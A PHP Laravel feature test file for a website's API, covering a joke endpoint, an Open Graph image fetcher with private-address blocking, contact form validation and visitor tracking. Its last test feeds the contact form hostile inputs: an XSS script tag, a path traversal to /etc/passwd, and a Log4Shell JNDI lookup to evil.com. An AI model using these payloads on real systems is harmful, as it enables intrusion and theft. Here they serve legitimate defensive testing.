<?php

namespace Tests\Feature;

use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Http;
use Tests\TestCase;

class ApiTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        Storage::fake('public');
    }

    // Random Joke API Tests
    public function test_random_joke_endpoint_returns_json(): void
    {
        Cache::put('jokes_data', [
            [
                'id' => 'test_joke_1',
                'setup' => 'Why did the skeleton go to the party alone?',
                'punchline' => 'Because he had no body to go with!',
                'category' => 'skeleton'
            ]
        ]);

        $response = $this->get('/api/random-joke');

        $response->assertStatus(200)
                ->assertJsonStructure(['id', 'setup', 'punchline', 'category'])
                ->assertJson([
                    'id' => 'test_joke_1',
                    'setup' => 'Why did the skeleton go to the party alone?',
                    'punchline' => 'Because he had no body to go with!',
                    'category' => 'skeleton'
                ]);
    }

    public function test_random_joke_endpoint_handles_no_jokes(): void
    {
        // Set empty jokes data in cache to simulate no jokes scenario
        Cache::put('jokes_data', []);

        $response = $this->get('/api/random-joke');

        $response->assertStatus(503)
                ->assertJson(['error' => 'No jokes available']);
    }

    public function test_random_joke_endpoint_handles_invalid_joke_data(): void
    {
        Cache::put('jokes_data', ['invalid_joke_data']);

        $response = $this->get('/api/random-joke');

        $response->assertStatus(500)
                ->assertJson(['error' => 'Invalid joke data']);
    }

    public function test_random_joke_endpoint_returns_different_jokes(): void
    {
        Cache::put('jokes_data', [
            ['id' => 'joke_1', 'setup' => 'Setup 1', 'punchline' => 'Punchline 1', 'category' => 'test'],
            ['id' => 'joke_2', 'setup' => 'Setup 2', 'punchline' => 'Punchline 2', 'category' => 'test']
        ]);

        $responses = [];
        for ($i = 0; $i < 10; $i++) {
            $response = $this->get('/api/random-joke');
            $responses[] = $response->json('id');
        }

        $this->assertContains('joke_1', $responses);
        $this->assertContains('joke_2', $responses);
    }

    // Open Graph Image API Tests
    public function test_fetch_og_image_validates_url(): void
    {
        $response = $this->get('/api/fetch-og-image');
        $response->assertStatus(302); // Laravel validation redirects

        $response = $this->get('/api/fetch-og-image?url=invalid-url');
        $response->assertStatus(302); // Laravel validation redirects for invalid URL format
    }

    public function test_fetch_og_image_blocks_private_addresses(): void
    {
        $privateUrls = [
            'http://localhost',
            'http://127.0.0.1',
            'http://192.168.1.1',
            'http://10.0.0.1'
        ];

        foreach ($privateUrls as $url) {
            $response = $this->get('/api/fetch-og-image?url=' . urlencode($url));
            $response->assertStatus(422)
                    ->assertJson(['error' => 'Invalid target host']);
        }
    }

    public function test_fetch_og_image_rate_limiting(): void
    {
        $url = 'https://example.com';
        Cache::put('og_fetch_' . md5($url), true, 300);

        $response = $this->get('/api/fetch-og-image?url=' . urlencode($url));

        $response->assertStatus(429)
                ->assertJson(['error' => 'Rate limited - try again later']);
    }

    public function test_fetch_og_image_handles_http_errors(): void
    {
        Http::fake([
            'example.com' => Http::response('', 404)
        ]);

        $response = $this->get('/api/fetch-og-image?url=https://example.com');

        $response->assertStatus(502)
                ->assertJsonStructure(['error', 'status']);
    }

    public function test_fetch_og_image_successful_fetch(): void
    {
        $html = '<html><head><meta property="og:image" content="https://example.com/image.jpg"></head></html>';
        $imageData = 'fake-image-data-' . str_repeat('x', 1000);

        Http::fake([
            'example.com' => Http::response($html, 200),
            'example.com/image.jpg' => Http::response($imageData, 200, ['Content-Type' => 'image/jpeg'])
        ]);

        $response = $this->get('/api/fetch-og-image?url=https://example.com');

        $response->assertStatus(200)
                ->assertJsonStructure(['url']);
        
        $url = $response->json('url');
        if (is_string($url)) {
            $this->assertStringContainsString('/storage/og-cache/', $url);
        } else {
            $this->fail('Expected URL to be a string');
        }
    }

    // Contact Form API Tests
    public function test_contact_form_validation(): void
    {
        $response = $this->post('/contact', []);

        $response->assertStatus(302)
                ->assertSessionHasErrors(['first_name', 'last_name', 'email', 'message']);
    }

    public function test_contact_form_email_validation(): void
    {
        $response = $this->post('/contact', [
            'first_name' => 'John',
            'last_name' => 'Doe',
            'email' => 'invalid-email',
            'message' => 'Test message'
        ]);

        $response->assertStatus(302)
                ->assertSessionHasErrors(['email']);
    }

    public function test_contact_form_field_length_validation(): void
    {
        $response = $this->post('/contact', [
            'first_name' => str_repeat('a', 256),
            'last_name' => str_repeat('b', 256),
            'email' => 'test@' . str_repeat('c', 250) . '.com',
            'message' => str_repeat('d', 5001)
        ]);

        $response->assertStatus(302)
                ->assertSessionHasErrors(['first_name', 'last_name', 'email', 'message']);
    }

    public function test_contact_form_submission(): void
    {
        $contactData = [
            'first_name' => 'John',
            'last_name' => 'Doe',
            'email' => 'john@example.com',
            'message' => 'Test message'
        ];

        $response = $this->post('/contact', $contactData);

        $response->assertStatus(302)
                ->assertSessionHas('success', 'Thank you! Your message has been sent.');

        $this->assertDatabaseHas('contacts', $contactData);
    }

    // Visitor Tracking API Tests
    public function test_visitor_tracking_options_request(): void
    {
        $response = $this->options('/track-visit');
        $response->assertStatus(200);
    }

    public function test_visitor_tracking_post_request(): void
    {
        $response = $this->postJson('/track-visit', [
            'referrer' => 'https://google.com',
            'subdomain' => 'www'
        ]);

        $response->assertStatus(200)
                ->assertJsonStructure([
                    'success',
                    'message',
                    'data' => ['ip', 'city', 'country']
                ])
                ->assertJson(['success' => true]);
    }

    public function test_visitor_tracking_without_optional_fields(): void
    {
        $response = $this->postJson('/track-visit', []);

        $response->assertStatus(200)
                ->assertJsonStructure(['success', 'message', 'data']);
    }

    public function test_visitor_tracking_with_invalid_json(): void
    {
        $response = $this->post('/track-visit', [], ['Content-Type' => 'application/json']);

        $response->assertStatus(200);
    }

    // API Documentation Tests
    public function test_api_documentation_routes(): void
    {
        $response = $this->get('/api/docs');
        $response->assertStatus(200);

        $response = $this->get('/openapi.yaml');
        $response->assertStatus(200)
                ->assertHeader('Content-Type', 'application/x-yaml');
    }

    // Error Handling Tests
    public function test_404_for_nonexistent_api_endpoints(): void
    {
        $response = $this->get('/api/nonexistent');
        $response->assertStatus(404);
    }

    public function test_gone_routes_return_410(): void
    {
        $goneRoutes = ['/login', '/register', '/cryptescape', '/demo'];
        
        foreach ($goneRoutes as $route) {
            $response = $this->get($route);
            $response->assertStatus(410);
        }
    }

    // Security Tests
    public function test_api_endpoints_handle_malicious_input(): void
    {
        $maliciousInputs = [
            '<script>alert("xss")</script>',
            '../../etc/passwd',
            'javascript:alert(1)',
            '${jndi:ldap://evil.com/a}'
        ];

        foreach ($maliciousInputs as $input) {
            $response = $this->post('/contact', [
                'first_name' => $input,
                'last_name' => 'Test',
                'email' => 'test@example.com',
                'message' => 'Test message'
            ]);
            
            $response->assertStatus(302);
        }
    }
}